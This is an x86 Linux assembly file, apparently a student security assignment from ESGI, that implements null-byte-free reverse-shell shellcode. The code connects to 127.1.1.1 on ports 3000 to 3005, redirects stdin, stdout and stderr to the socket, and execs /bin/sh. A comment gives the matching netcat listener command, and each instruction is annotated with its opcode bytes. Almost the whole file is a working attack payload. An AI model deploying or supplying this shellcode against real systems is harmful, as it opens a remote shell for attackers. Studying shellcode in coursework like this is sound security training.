; NOM / Prénom : NEHME Ali - MEZANI Nazim
; REVERSE SHELL ASM
; M1 - Sécurité - GR3
; ESGI
;

section .text
    global _start

; nc -l -p 3005 -s 127.1.1.1
; m2elf.pl -in test-asm.m (test-asm.m ==> shellcode)

_start:

    sub eax, eax        ;; 29 c0
    push eax            ;; 50
    mov ax, 0x0167      ;; 66 B8 67 01

    pop ebx             ;; 5b
    mov bl, 0x2         ;; B3 02

    xor ecx, ecx        ;; 31 c9
    inc ecx             ;; 41
    
    xor edx, edx        ;; 31 D2
    int 0x80            ;; cd 80
    mov ebx, eax        ;; 89 C3

    ; Scan de port + Connexion ----------------------------------------------------------------------------------------------------------------------
    xor esi, esi            ;; 31 f6 
    _while_port_scanning:   ; Scan port
        push 0x0101017f     ; IP ;; 68 7f 01 01 01
        sub eax, eax        ;; 29 c0 

        mov di, 0x0bb8      ;; 66 bf b8 0b
        add edi, esi        ;; 01 f7
        rol di, 8           ;; 66 c1 c7 08
        push di             ;; 66 57

        mov dl, 0x2         ;; b2 02
        push dx             ;; 66 52

        mov ax, 0x16a       ;; 66 b8 6a 01
        
        mov ecx, esp        ;; 89 e1
        mov dl, 0x10        ;; b2 10
        int 0x80            ;; cd 80
   
        test eax, eax       ;; 85 c0     ; si il n'y a pas d'erreur, la connection a eut lieu.
        jnz _port_unused    ;; 75 02
        jmp _end_connect_to_ip_port ;; eb 08
        
        _port_unused : 
            inc esi         ;; 46
            cmp esi, 0x5    ;; 83 fe 05     ; Si il y a encore des "try", continuer dans le while sinon, quitter le programme.
            jle _while_port_scanning    ;; 7e d3 
            jmp _no_port_to_connect_to_ip   ;; eb 23
        
        _end_connect_to_ip_port:


    ;; pour ne pas avoir de nullbyte avec "int 0x80" ET "add eax, 0x3"
    push eax            ;; 50
    push 0x68732f6e     ;; 68 6e 2f 73 68
    push 0x69622f2f     ;; 68 2f 2f 62 69

    add eax, 0x3        ;; 04 03
    mov ecx, eax        ;; 89 C1

    not_finish_dup:     ;; jump ==> 0xff - 0x06 => 0xf9 (0x06 == nombre de caractères pour atteindre le label "not_finish_dup")
    mov al, 0x3f        ;; B0 3f
    dec ecx             ;; 49
    int 0x80            ;; cd 80
    jnz not_finish_dup  ;; 75 f9

    mov eax, ecx        ;; 89 C8
    mov dl, 0x0b        ;; b2 0b
    xchg eax, edx       ;; 92       ;; Etant donné que mov eax, 0x0b (b0 03), la solution qu'on a trouvé est d'inverser le stockage des données pour eax & edx (vu que mov edx, 0x0b ==> b2 0b) puis de les remettre à leur place avec xchg 

    ; lea ebx, [esp]    ;; 8D 1C 24
    mov ebx, esp        ;; 89 e3
    int 0x80            ;; cd 80

    ;; voir si après le execv, le exit sert à quelque chose
    _no_port_to_connect_to_ip:
        xor eax, eax      ;; 31 c0
        inc eax           ;; 40
        xor ebx, ebx      ;; 31 db
        int 0x80          ;; cd 80